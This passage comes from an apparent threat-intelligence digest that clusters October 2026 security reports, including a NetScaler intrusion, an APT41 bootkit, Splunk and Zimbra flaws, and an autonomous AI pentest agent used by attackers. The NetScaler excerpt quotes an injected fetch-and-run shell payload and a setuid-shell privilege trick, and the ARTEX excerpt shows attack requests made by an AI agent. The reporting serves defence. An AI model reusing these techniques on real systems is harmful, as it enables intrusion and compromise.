misconfiguration that led to critical, unintended exposure. Specifically, organizations frequently mapped GlobalProtect (GP) profiles to HTTP/HTTPS services on their management interfaces. This configuration inadvertently exposes the management interface to the internet on specific ports, most notably 4443 and 3879, often without administrators' knowledge. While the risks of this exposure were previously documented, the frequency of this oversight during the Lunar Peak incidents prompted a comprehensive update to our official guidance to ensure maximum clarity. Verification and mitigation: Verify exposure : Defenders can rapidly verify whether their e
```

#### Corroborating sources (3)

- **Unit 42** (threat_research_primary)
  - Title: Threat Brief: Active Exploitation of May 2026 PAN-OS CVE-2026-0257 (Updated October 20)
  - Published: 2026-10-20T20:30:42+00:00
  - Link: https://unit42.paloaltonetworks.com/active-exploitation-of-pan-os-cve-2026-0257/
  - Summary: Ransomware operators including Spikey Scorpius (aka Qilin) and Tarnished Scorpius (aka Inc) are exploiting PAN-OS vulnerability CVE-2026-0257. The post Threat Brief: Active Exploitation of May 2026 PAN-OS CVE-2026-0257 (Updated October 20) appeared first on Unit 42 .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Qilin and INC Ransomware Groups Exploit Palo Alto Networks Flaw to Bypass MFA
  - Published: 2026-10-20T15:32:27+00:00
  - Link: https://thehackernews.com/2026/10/qilin-and-inc-ransomware-groups-exploit.html
  - Summary: Palo Alto Networks has disclosed that it's continuing to observe exploitation of a now-patched security flaw impacting PAN-OS and Prisma Access by ransomware actors. The activity relates to CVE-2026-0257 (CVSS score: 7.8), an authentication bypass flaw that could be exploited by bad actors to set up unauthorized VPN connections. It was patched by Palo Alto Networks in May 2026 and was
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: BeyondTrust Remote Support Zero-Day Continues Trend of Exploited Edge Bugs
  - Published: 2026-10-16T20:34:37+00:00
  - Link: https://www.darkreading.com/endpoint-security/beyondtrust-remote-support-exploited-edge-bugs
  - Summary: Ivanti, Cisco, and Palo Alto Networks all had vulnerabilities in edge devices come under fire this week. Now BeyondTrust joins the group.

### Cluster 790f27e740 — score 25

- Title: Rapid7 Analysis: NetScaler intrusions chaining CVE-2026-88771 and CVE-2026-88779
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-10-19T15:11:57+00:00
- Link: https://www.rapid7.com/blog/post/ra-netscaler-intrusions-chaining-cve-2026-88771-and-cve-2026-88779
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-88771, CVE-2026-88779, Citrix

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: Citrix
- cve_ids: CVE-2026-88771, CVE-2026-88779
- urgency_signals: actively_exploited
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_2_operator

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: Citrix
- cve_ids: CVE-2026-88771, CVE-2026-88779
- urgency_signals: actively_exploited
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview In early October 2026, Rapid7 analysts investigated a compromise of a Citrix NetScaler ADC appliance. The appliance was running an affected 14.1 build and was exposed to active exploitation targeting NetScaler authentication and SAML deployments. The intrusion achieved root code execution, deployed multiple persistence mechanisms, installed PHP web shells, created outbound command-and-control and internal tunnelling capabilities, performed targeted reconnaissance of DNS, LDAP/Active Directory, management services and VMware vCenter infrastructure, and exfiltrated NetScaler configuration and key material. The activity overlaps with public reporting on the WHIPSHOT/SLAPSHOT NetScaler campaign. However, this case provides additional detail on the operational lifecycle, including repeated post-reboot execution through the crash-handling workflow, HA-aware persistence, a dedicated Go reconnaissance tool, a separate FreeBSD proxy agent, and a staged collection pipeline. Key findings
```

#### Full body

```
Rapid7 Intelligence Rapid7 Analysis: NetScaler intrusions chaining CVE-2026-88771 and CVE-2026-88779 Davide Massini | Kuky Pham | Edoardo Giuggioloni | Jose Romero Oct 19, 2026 | Last updated on Oct 22, 2026 | 10 min read Rapid7 Analysis: NetScaler intrusions chaining CVE-2026-88771 and CVE-2026-88779 Table of contents Rapid7 Analysis: NetScaler intrusions chaining CVE-2026-88771 and CVE-2026-88779 Table of contents Overview In early October 2026, Rapid7 analysts investigated a compromise of a Citrix NetScaler ADC appliance. The appliance was running an affected 14.1 build and was exposed to active exploitation targeting NetScaler authentication and SAML deployments. The intrusion achieved root code execution, deployed multiple persistence mechanisms, installed PHP web shells, created outbound command-and-control and internal tunnelling capabilities, performed targeted reconnaissance of DNS, LDAP/Active Directory, management services and VMware vCenter infrastructure, and exfiltrated NetScaler configuration and key material. The activity overlaps with public reporting on the WHIPSHOT/SLAPSHOT NetScaler campaign. However, this case provides additional detail on the operational lifecycle, including repeated post-reboot execution through the crash-handling workflow, HA-aware persistence, a dedicated Go reconnaissance tool, a separate FreeBSD proxy agent, and a staged collection pipeline. Key findings The first confirmed root execution occurred shortly after attacker-controlled text was inserted into a NetScaler authentication username. The injected text caused or immediately preceded repeated nsaaad crashes and a Pitboss reboot. After reboot, the NetScaler call-home crash handler processed the retained attacker-controlled text and executed a payload as root. The attacker installed cookie-authenticated PHP web shells behind CSS-looking Apache aliases. The attacker set /bin/sh to mode 6555, allowing an unprivileged web process to obtain effective root privileges. The implant framework maintained access through cron, rc.netscaler, watchdog loops, an outbound reverse agent, and an HTTP-fronted TCP proxy. HA synchronization and forced failover logic attempted to preserve access across the appliance pair. A Go tool mapped internal routes, DNS, LDAP/AD, management services and VMware vCenter systems. NetScaler configuration, historical configurations, HTTP configuration, diagnostics and system backup material were staged for exfiltration. Technical Analysis Initial access The first event was an authentication request containing attacker-controlled text similar to: pitboss PPE unexpectedly died NSPPE;fetch${IFS}-qo${IFS}/v ...;sh${IFS}/v;# The observed chain was: Figure 1: Sequence diagram showing the attack chain Logs collected show attackers chaining CVE-2026-88771 , the pre-authentication log-poisoning/RCE issue, with CVE-2026-88779 , the separate SAML-parsing crash. A two-vulnerability sequence in which the SAML parsing flaw supplies a crash/reboot condition while the log-poisoning flaw supplies attacker-controlled command text. The evidence demonstrates more than an attempted chain: the injected command, nsaaad crash loop, Pitboss reboot, post-reboot handler activity, and root payload execution are all directly correlated across independent logs and filesystem timestamps. The first implant files were created at the same second as the first logged post-reboot execution, and later stages, web shells, tunnels, reconnaissance tooling and exfiltration were confirmed. Rapid7 also published an ETR on the Netscaler zero days currently exploited in the wild. Repeated post-reboot execution The initial execution was not a one-time event. The appliance recorded repeated Pitboss-initiated reboots and repeated call-home handler executions over several days. The handler re-executed stages from multiple infrastructure addresses and the repeated execution model allowed the operator to refresh persistence, deploy new components and continue collectio
```

#### Corroborating sources (2)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Rapid7 Analysis: NetScaler intrusions chaining CVE-2026-88771 and CVE-2026-88779
  - Published: 2026-10-19T15:11:57+00:00
  - Link: https://www.rapid7.com/blog/post/ra-netscaler-intrusions-chaining-cve-2026-88771-and-cve-2026-88779
  - Summary: Overview In early October 2026, Rapid7 analysts investigated a compromise of a Citrix NetScaler ADC appliance. The appliance was running an affected 14.1 build and was exposed to active exploitation targeting NetScaler authentication and SAML deployments. The intrusion achieved root code execution, deployed multiple persistence mechanisms, installed PHP web shells, created outbound command-and-control and internal tunnelling capabilities, performed targeted reconnaissance of DNS, LDAP/Active Directory, management services and VMware vCenter infrastructure, and exfiltrated NetScaler configuration and key material. The activity overlaps with public reporting on the WHIPSHOT/SLAPSHOT NetScaler campaign. However, this case provides additional detail on the operational lifecycle, including repeated post-reboot execution through the crash-handling workflow, HA-aware persistence, a dedicated Go reconnaissance tool, a separate FreeBSD proxy agent, and a staged collection pipeline. Key findings
- **Cloudflare Security** (cloud_identity_infrastructure)
  - Title: Beyond the patch: Protecting your NetScaler gateway against future vulnerabilities
  - Published: 2026-10-19T13:00:00+00:00
  - Link: https://blog.cloudflare.com/protect-your-netscaler-gateway/
  - Summary: CVE-2026-88771 lets attackers run commands on NetScaler Gateway before anyone signs in. Patching takes time most teams don't have, so the sign-in decision has to move in front of the vulnerable code.

### Cluster 26535002b4 — score 24

- Title: How APT41 revived the BlackLotus bootkit to attack diplomatic organizations in Central Asia
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-10-22T06:00:48+00:00
- Link: https://securelist.com/uefi-bootkit-blackx/121539/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: APT41, CVE-2022-21894

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage
- actor_attribution: APT41
- affected_products: Microsoft Windows
- cve_ids: CVE-2022-21894
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: apt_espionage, active_exploitation
- actor_attribution: APT41
- affected_products: Microsoft Windows
- cve_ids: CVE-2022-21894
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Kaspersky GReAT experts discovered a new UEFI bootkit, BlackX. It exploits the Baton Drop vulnerability (CVE-2022-21894) and is similar to the BlackLotus bootkit.
```

#### Full body

```
Table of Contents Introduction The return of the infamous bootkit Payload launched by the bootkit User-mode second-stage payloads Attribution Why did the target organizations get infected? Conclusion Authors Georgy Kucherin Vladimir Nestor Vasily Berdnikov Introduction Back in October 2022, Kaspersky GReAT was looking into a peculiar advertisement on a hacking forum. A cybercriminal had been advertising a UEFI bootkit, dubbed BlackLotus, that could bypass Secure Boot, for $5,000. Given the low price for such powerful capabilities, the cybersecurity community initially took this advertisement with a grain of salt. As no BlackLotus samples were found in the wild, no one could at the time verify the claims made in the forum post. BlackLotus advertisement However, about half a year later, in March 2023, ESET confirmed that the BlackLotus advertisement was genuine. The researchers tracked down samples of this bootkit and confirmed that it can indeed bypass Secure Boot through a vulnerability called Baton Drop (CVE-2022-21894). As this vulnerability was still exploitable in 2023, Microsoft had to release multiple security updates to address it. Since the release of these updates, the BlackLotus bootkit has gone quiet — no publicly known attacks have used it. Yet in early 2026, we discovered a malware sample similar to BlackLotus that was used in an APT campaign in Central Asia. In this report, we share our findings, including new payloads and possible attribution of this campaign. The return of the infamous bootkit In early 2026 we identified a complex APT attack targeting diplomatic agencies in Central Asian countries — namely Tajikistan, Uzbekistan, and Turkmenistan. This attack involved a UEFI bootkit that we dubbed BlackX. Having examined it, we found it to be similar to BlackLotus. Attackers have been deploying BlackX after compromising the victim machine networks and obtaining administrator privileges. To install the bootkit, we observed them dropping the following files: inst.exe , an installer executable PVMDIJGKAX2 , an RC4-encrypted extensionless file containing files and strings required for the installation The installer was launched with the command line C:\ProgramData\Intel\inst.exe PVMDIJGKAX2 Q46F6MDLI3RX2KV1 . The last argument here is the RC4 key used for decryption. Curiously, the file inst.exe does not contain any malicious strings or embedded blobs. All the files needed to install the malicious payload are inside PVMDIJGKAX2 , which makes it harder for incident responders to retrieve the bootkit components. The installer package drops a set of files to both system and UEFI partitions, designed to exploit the Baton Drop vulnerability. We noted that the implementation of the exploit is remarkably similar to the one used in the BlackLotus malware. As with BlackLotus, the goal of the exploit is to install custom Machine Owner Keys (MOK), which allows loading arbitrary EFI files on the target machines to manipulate Secure Boot. While the vulnerability exploitation chain was implemented very similarly to BlackLotus, we spotted differences between the exploits in BlackLotus and BlackX. That said, the source code of the BlackLotus bootkit has never been published online. This could mean that the attackers behind BlackX either reverse-engineered the BlackLotus bootkit or purchased its source code from cybercriminals. Either way, this is an interesting observation, as we rarely see APT actors borrow ideas or code from cybercrime actors. Payload launched by the bootkit The UEFI payload delivered during the Baton Drop exploitation has a classic bootkit goal — to inject a malicious driver into the Windows kernel. This driver differs from the one deployed by BlackLotus and is signed with a certificate belonging to an organization named 温江区明宇网络技术服务工作室 (English: Wenjiang District Mingyu Network Technology Service Studio). At the time of writing, this certificate (serial number: 0bcdf5e0da32d68900b8b7638459d072) has been revoked
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: How APT41 revived the BlackLotus bootkit to attack diplomatic organizations in Central Asia
  - Published: 2026-10-22T06:00:48+00:00
  - Link: https://securelist.com/uefi-bootkit-blackx/121539/
  - Summary: Kaspersky GReAT experts discovered a new UEFI bootkit, BlackX. It exploits the Baton Drop vulnerability (CVE-2022-21894) and is similar to the BlackLotus bootkit.

### Cluster 59969a7c2a — score 24

- Title: CVE-2026-76268 | Splunk Enterprise Patroni REST API Missing Authentication Vulnerability
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-10-22T20:25:59+00:00
- Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-76268/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-76268

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, vulnerability_disclosure
- affected_products: GitHub, Ivanti
- cve_ids: CVE-2026-101767, CVE-2026-104935, CVE-2026-109618, CVE-2026-109619, CVE-2026-76268
- urgency_signals: actively_exploited, critical_cvss, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: vulnerability_disclosure, active_exploitation
- affected_products: Ivanti, GitHub
- cve_ids: CVE-2026-76268, CVE-2026-109618, CVE-2026-109619, CVE-2026-101767, CVE-2026-104935
- urgency_signals: actively_exploited, preauth_unauth, critical_cvss
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Horizon3.ai's NodeZero Rapid Response test helps security teams validate exposure to CVE-2026-76268, a critical Splunk Enterprise vulnerability that could allow unauthenticated attackers with network access to execute operating-system commands.
```

#### Full body

```
CVE-2026-76268 Splunk Enterprise Patroni REST API Missing Authentication Vulnerability CVE-2026-76268 is a critical missing authentication vulnerability in Splunk Enterprise. An unauthenticated attacker with network access to the Patroni REST API on a search head cluster member could execute attacker-controlled operating-system commands. Splunk rates the vulnerability 9.8 (Critical) under CVSS v3.1 . Its advisory does not report active exploitation. Splunk Vulnerability Disclosure A public repository contains code presented as a proof of concept for this CVE. GitHub Technical Details The vulnerability exists because the Patroni REST API does not require authentication for critical configuration operations. An attacker who can reach the affected interface on a search head cluster member could abuse those operations to execute operating-system commands. Weakness: CWE-306, Missing Authentication for Critical Function. Attack vector: Network access to the affected Patroni REST API. Authentication: No credentials or existing privileges required. User interaction: None required. Impact: Operating-system command execution, with potentially high impact to confidentiality, integrity, and availability. CVSS v3.1: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H Internet exposure is not required. An attacker with internal network access to the affected interface could also exploit the vulnerability. Stop Guessing, Start Proving Schedule a demo NodeZero® Proactive Security Platform Rapid Response A NodeZero Rapid Response test has been developed to safely validate whether this vulnerability can be exploited in your environment. The test executes real attack techniques without causing damage, giving teams immediate clarity on exposure. Run the Rapid Response test: Launch from the NodeZero platform to determine whether exploitation is possible. Patch immediately: Upgrade to a fixed version or apply the vendor-recommended workaround where appropriate. Re-run the test: Verify that the vulnerability is no longer exploitable after remediation. Affected versions & patch Affected Splunk Enterprise 10.4.0 through 10.4.2 . Splunk Enterprise 10.2.0 through 10.2.6 . Splunk Enterprise 10.0.x and 9.4.x are not affected by this CVE . Fixed Splunk Enterprise 10.4.3 or later in the 10.4 branch . Splunk Enterprise 10.2.7 or later in the 10.2 branch . Mitigations If you cannot immediately upgrade and do not use Edge Processor, OpAmp, or SPL2 data pipelines , Splunk recommends disabling the PostgreSQL sidecar. In $SPLUNK_HOME/etc/system/local/server.conf, set: [postgres] disabled = true Restart Splunk Enterprise to apply the change. Use this workaround only when the listed features are unused. Timeline October 7, 2026: Splunk published advisory SVD-2026-1001, identifying the vulnerability and fixed versions 10.4.3 and 10.2.7. October 7, 2026: The CVE record was published. [Month Day, 2026]: Horizon3 released the NodeZero Rapid Response test for CVE-2026-76268. References Splunk Security Advisory SVD-2026-1001 Splunk Documentation: Sidecar Configuration Settings CVE.org Record: CVE-2026-76268 NIST NVD Record: CVE-2026-76268 Public Repository Describing a Proof of Concept Read about other CVEs CVE-2026-109618 / CVE-2026-109619 PHP2Shell refers to two critical PHP core vulnerabilities, CVE-2026-109618 and CVE-2026-109619, that can enable unauthenticated remote code execution. Explore the… Read more CVE-2026-101767 CVE-2026-101767 is a critical (CVSS 9.8) unauthenticated SQL injection vulnerability in Oracle E-Business Suite 12.2.3–12.2.15. Horizon3 researchers identified an attack… Read more CVE-2026-104935 CVE-2026-104935 is an actively exploited Ivanti Connect Secure authentication bypass that can enable remote code execution. Review the exploit chain,… Read more NodeZero ® Platform Implement a continuous find, fix, and verify loop with NodeZero The NodeZero ® platform empowers your organization to reduce your security risks by autonomously finding exploitable we
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-76268 | Splunk Enterprise Patroni REST API Missing Authentication Vulnerability
  - Published: 2026-10-22T20:25:59+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-76268/
  - Summary: Horizon3.ai's NodeZero Rapid Response test helps security teams validate exposure to CVE-2026-76268, a critical Splunk Enterprise vulnerability that could allow unauthenticated attackers with network access to execute operating-system commands.

### Cluster 9c6133d08b — score 22

- Title: How CVE-2026-73570 turns a Zimbra log file into remote code execution
- Source: Elastic Security Labs (detection_response_operations)
- Published: 2026-10-23T00:00:00+00:00
- Link: https://www.elastic.co/security-labs/threat-command/command-injection-zimbra-cve-2026-73570
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-73570

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-73570
- urgency_signals: no_patch_yet, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- cve_ids: CVE-2026-73570
- urgency_signals: preauth_unauth, no_patch_yet
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
We reproduced the Zimbra command injection vulnerability and found that several public PoCs write a payload Swatchdog never matches, so a failed test looks like a patched server.
```

#### Full body

```
Threat Command How CVE-2026-73570 turns a Zimbra log file into remote code execution We reproduced the Zimbra command injection vulnerability and found that several public PoCs write a payload Swatchdog never matches, so a failed test looks like a patched server. October 23, 2026 Eric Forte Detection Engineering Threat Intelligence Jump to Share When we are building detections for various threats, we regularly run the exploits on representative systems to help us build high-quality rules. The Common Vulnerabilities and Exposures (CVE) entry CVE-2026-73570 for Zimbra is no exception. Zimbra is a widely used enterprise email and collaboration software platform, known for its SMTP platform, among other services. SMTP plays a critical role in the infrastructure of many organizations by providing email services that often include either direct or indirect identity management. In addition to the direct appeal for attackers to read emails, attachments, etc., there is also an appeal for compromised identity management. A compromised mail server can be used to impersonate legitimate accounts for further access and exploitation, becoming a staging ground for additional targets. CVE-2026-73570 is an unauthenticated command injection vulnerability in Zimbra, and one malformed recipient address is enough to trigger it. Send a malformed request and it is logged in /var/log/zimbra.log . From there, the Swatchdog monitoring daemon matches it against a service status pattern and passes it to /bin/sh inside a backticked Perl string. The result is remote code execution as the zimbra user. The account reads every mailbox on the server and sends as any local identity, so compromising the mail server compromises the identities it serves. We reproduced the full chain while building detections for it, and several of the public proofs of concept (PoCs) we tested write a payload that Swatchdog never matches, so a failed test looks like a patched server. The working chain is shown next, along with the rule that fires when a shell spawns anything other than snmptrap . Figure 1: Analyzing test activity in an Elastic stack. Note that if you host Zimbra Simple Mail Transfer Protocol (SMTP) services and haven’t patched to version 10.1.20+, please do so before trying out the steps in this blog post. How the Zimbra command injection vulnerability works The core entry point for this kind of attack is CVE-2026-73570, a vulnerability in an unpatched Zimbra service (patched as of Zimbra version 10.1.20). When exploited, it can provide arbitrary remote code execution bypassing authentication requirements. To do this, an attacker passes a specifically crafted SMTP message that’s written to the notification file /var/log/zimbra.log for processing. Under normal circumstances, entries are written to this log to keep track of the status of services, such as when a given mailbox service has started or a message delivery has failed: Sep 30 22:48:29 mail postfix/pickup[57597]: 6272F1E1393: uid=997 from=<zimbra> Sep 30 22:48:29 mail postfix/cleanup[57599]: 6272F1E1393: message-id=<20261001024829.6272F1E1393@mail.lab.test> Sep 30 22:48:29 mail postfix/qmgr[57598]: 6272F1E1393: from=<zimbra@mail.lab.test>, size=604, nrcpt=1 (queue active) Sep 30 22:48:29 mail postfix/error[57602]: 6272F1E1393: to=<zimbra@mail.lab.test>, orig_to=<zimbra>, relay=none, delay=4707, delays=4707/0.01/0/0.01, dsn=5.0.0, status=bounced (mail.lab.test) Sep 30 22:48:29 mail postfix/cleanup[57599]: 6DD441E13F5: message-id=<20261001024829.6DD441E13F5@mail.lab.test> Sep 30 22:48:29 mail postfix/bounce[57603]: 6272F1E1393: sender non-delivery notification: 6DD441E13F5 Sep 30 22:48:29 mail postfix/qmgr[57598]: 6DD441E13F5: from=<>, size=2463, nrcpt=1 (queue active) Sep 30 22:48:29 mail postfix/qmgr[57598]: 6272F1E1393: removed Sep 30 22:48:29 mail postfix/error[57602]: 6DD441E13F5: to=<zimbra@mail.lab.test>, relay=none, delay=0.01, delays=0.01/0/0/0, dsn=5.0.0, status=bounced (mail.lab.test) Sep 30 22:48:29
```

#### Corroborating sources (1)

- **Elastic Security Labs** (detection_response_operations)
  - Title: How CVE-2026-73570 turns a Zimbra log file into remote code execution
  - Published: 2026-10-23T00:00:00+00:00
  - Link: https://www.elastic.co/security-labs/threat-command/command-injection-zimbra-cve-2026-73570
  - Summary: We reproduced the Zimbra command injection vulnerability and found that several public PoCs write a payload Swatchdog never matches, so a failed test looks like a patched server.

### Cluster 0c3d84d7ed — score 20

- Title: ARTEX in the Wild: Storm-0940 Expands Targeting of IT and Software Vendors
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-10-22T13:05:31+00:00
- Link: https://www.wiz.io/blog/artex-in-the-wild-storm-0940-expands-targeting-of-it-and-software-vendors
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Okta

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, supply_chain
- affected_products: AWS, Microsoft 365, Okta
- urgency_signals: actively_exploited
- content_type: threat_research
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain, active_exploitation
- affected_products: Okta, Microsoft 365, AWS
- urgency_signals: actively_exploited
- content_type: threat_research
- confidence_tier: tier_2_operator

#### Summary

```
Wiz Research is tracking an ARTEX-using actor, overlapping with Storm-0940, across multiple targeted software vendors. Learn how the AI agent attacks Okta, Entra, and Cognito, and what it left behind in the logs.
```

#### Full body

```
Throughout October 2026, we identified an actor using tooling associated with ARTEX, an autonomous AI penetration-testing agent, to target multiple IT and software vendors. The activity focused on identity providers (Okta, Entra, Cognito) and abuse of Microsoft 365 integrations. We observed repeated attempts to uncover authentication bypasses, enumerate APIs, and access customer data (of the targeted vendors) across multiple environments. Our observations overlap with Microsoft's recent report on ​​Storm-0940 , a Chinese-state aligned actor - linked to the recent supply-chain attack involving stolen vendor credentials and downstream Microsoft 365 tenants . However, we have additionally observed the same infrastructure, tooling, and attack patterns targeting the sector as a whole. Pivoting on identified TTPs and IOCs, we have also identified the same actor expanding their attempted supply chain compromises into other software sectors. In this blog, we will describe the repeatable patterns and methodologies the ARTEX-using actor applied across multiple environments and cloud providers, with examples taken from real world attacks. What is ARTEX? ARTEX is an open-source autonomous penetration testing framework. A Chinese developer published it on GitHub in July 2026, and it won Baidu's "Agent+" red team challenge that September. In practice, an operator supplies a target and an objective. A planner agent then chooses the next step, worker agents run tools like nmap , curl , and Impacket , and every result feeds a shared graph of assets and findings. Attackers picked it up within weeks. ARTEX artifacts surfaced in attacks on South Korean banks in late September and attacks on Japanese companies in October . Microsoft and Zscaler have since tied it to two separate actors. The developer made the tool closed-source on October 8 . By then, the code had more than 12,000 forks. A repeatable playbook Across the investigated environments, we observed a consistent sequence of reconnaissance and attack attempts: Map the application: Download JavaScript bundles, exposed source maps, runtime configurations, and Swagger/OpenAPI documentation to discover internal API routes and application functionality. Probe authentication: Repeatedly initiate sign-in flows, manipulate OAuth callbacks and state parameters, test unsigned JWTs, and probe SSO and Microsoft 365-specific endpoints. Attack identity providers and login flows: Password-spray corporate Okta and Entra ID environments, and target internal and proprietary application login pages. Abuse account recovery: Repeatedly invoke password-reset, username-recovery, activation, and reset-token endpoints. Test tenant isolation: Register accounts using disposable email addresses where possible, then manipulate predictable identifiers to probe for broken access controls and unauthorized cross-tenant data access. Adapt to defense mechanisms: Rotate IP addresses when blocked, and constantly circulate user agents. What it looked like in the logs We analyzed these attack patterns using HTTP access logs collected via Wiz Agentless Workload Detection , alongside identity provider logs such as AWS Cognito events, Entra sign-in activity, and Okta authentication logs. Targeting Internal Applications The agent's first move across all observed instances of the attack was always to read the application itself. Requests like these showed up minutes after first contact: GET /packs/js/main-3a9f...js.map GET /assets/config.json GET /env.js GET /swagger/?format=openapi Not long after, it started calling internal API routes by name. The only place those route names appear is in the source maps it had just downloaded. Account recovery got the same treatment. The agent checked which usernames existed, then hammered the reset endpoints: GET /Account/ValidateUserName?UserName=admin POST /api/v1/Users/GeneratePasswordResetToken → 204 POST /forgot_password Where it could sign up, it did, using a throwaway mailbox from a free
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: ARTEX in the Wild: Storm-0940 Expands Targeting of IT and Software Vendors
  - Published: 2026-10-22T13:05:31+00:00
  - Link: https://www.wiz.io/blog/artex-in-the-wild-storm-0940-expands-targeting-of-it-and-software-vendors
  - Summary: Wiz Research is tracking an ARTEX-using actor, overlapping with Storm-0940, across multiple targeted software vendors. Learn how the AI agent attacks Okta, Entra, and Cognito, and what it left behind in the logs.

### Cluster 31cdc6c795 — score 19

- Title: Supply Chain Zero Days: Closing the Gap Between Publication and Detection
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-10-19T14:39:29+00:00
- Link: https://www.wiz.io/blog/detect-supply-chain-zero-days-at-publication
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, supply_chain, zero_day
- affected_industries: financial_services
- affected_products: npm
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain, zero_day, active_exploitation
- affected_industries: financial_services
- affected_products: npm
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
When trusted packages are compromised, malicious code can quickly spread throughout and beyond developer environments. See how Wiz’s supply chain pipeline identifies compromised packages at publication, helping teams detect zero-day supply chain compromises in Wiz Defend before a CVE is published
```

#### Full body

```
Modern software development depends on open source packages. Developers and AI coding agents can pull new dependencies and versions into projects at speed, helping teams build and ship faster. But that speed creates a challenge for security teams. When a trusted package is compromised, malicious code can enter development environments and build pipelines before traditional vulnerability databases flag the threat. Organizations cannot manually review or block every update to foundational packages without slowing development. Therefore, most organizations scan newly downloaded packages against known vulnerabilities and block if needed. But, zero-day supply chain compromises won’t show up in vulnerability databases right away; and, because popular packages are already trusted, developer workflows and build pipelines are often configured to automatically pull their latest versions. If an attacker compromises one of those packages, a malicious update can spread across the environment before a CVE is even published, leaving security teams to defend from behind. Trusted package compromises in the wild Our own research team is seeing this technique in practice more often than ever before. In H2 2025, notable supply chain attacks made up about 10% of significant incidents. In H1 2026, that percentage increased to 25%, and now, notable supply chain attacks account for 1 in 4 significant security incidents. During the Axios compromise, for example, an unknown threat actor compromised the npm account of an axios maintainer and published two malicious versions of the npm package (v1.14.1, v0.30.4), which introduced a dependency on plain-crypto-js, a newly created malicious package . Although the malicious versions were removed within hours, that didn't mean that the threat disappeared. According to the Wiz Research team’s own observations, at the time, Axios was present in approximately 80% of cloud and code environments, and downloaded around 100 million times per week. The package’s popularity enabled rapid exposure, with observed execution in 3% of affected environments. This reality underlines the importance of speed in defending against supply chain attacks. Detecting malicious packages at publication Traditionally, security teams find out a trusted package was compromised by receiving a threat advisory or vulnerability database update. In an ideal world, teams could take a proactive approach to securing the software supply chain by knowing which packages published to npm are clean, preventing installation of those that are not, and alerting on malicious versions across all tools. That’s why we built a dedicated supply chain detection pipeline to analyze new packages and versions as soon as they are published to npm. This allows us to flag malicious packages and add detection rules in Wiz Defend, code and cloud pipelines, all before a formal CVE is published. Here’s how it works: When a new package version is released, the pipeline downloads and extracts the current version and previous versions for comparison. Static analysis techniques flag suspicious files. This analysis feeds into our AI classifier engine, which returns an initial verdict. Suspicious versions undergo dynamic analysis to validate the verdict. This dynamic analysis involves in depth work to understand the file contents, including: Installing the package version in a sandbox environment to monitor runtime activity. Importing the version and exposed modules . Running the package from the CLI (where possible). The Wiz Sensor observes runtime behavior to monitor for malicious activity. This helps the pipeline confirm the suspicious verdict, and provides our AI classifier with additional evidence. The AI classifier returns the final verdict, generated based on all previous analyses. Once a version is confirmed as malicious, the pipeline automatically publishes IOCs to the Wiz reputation service. This ensures that Wiz customers are alerted as soon as a package enters thei
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Supply Chain Zero Days: Closing the Gap Between Publication and Detection
  - Published: 2026-10-19T14:39:29+00:00
  - Link: https://www.wiz.io/blog/detect-supply-chain-zero-days-at-publication
  - Summary: When trusted packages are compromised, malicious code can quickly spread throughout and beyond developer environments. See how Wiz’s supply chain pipeline identifies compromised packages at publication, helping teams detect zero-day supply chain compromises in Wiz Defend before a CVE is published

### Cluster 27252b6951 — score 19

- Title: PHP shares mitigation for new RCE vulnerability with no patch
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-10-23T15:38:05+00:00
- Link: https://www.bleepingcomputer.com/news/security/php-shares-mitigation-for-new-and-unpatched-rce-vulnerability/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, vulnerability_disclosure
- affected_industries: critical_infrastructure
- affected_products: AWS, GitLab
